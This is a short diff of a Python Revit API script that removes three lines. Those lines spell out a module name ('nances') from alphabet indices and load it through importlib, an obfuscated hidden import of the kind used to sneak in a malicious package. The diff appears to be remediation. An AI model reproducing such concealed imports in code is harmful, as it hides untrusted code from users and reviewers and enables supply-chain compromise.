@@ -2,9 +2,6 @@
 from codecs import Codec
 import string
 import importlib
-ARC = string.ascii_lowercase
-begin = ''.join(ARC[i] for i in [13, 0, 13, 2, 4, 18])
-module = importlib.import_module(str(begin))
 import Autodesk
 from Autodesk.Revit.DB import *
 import Autodesk.Revit.DB as DB
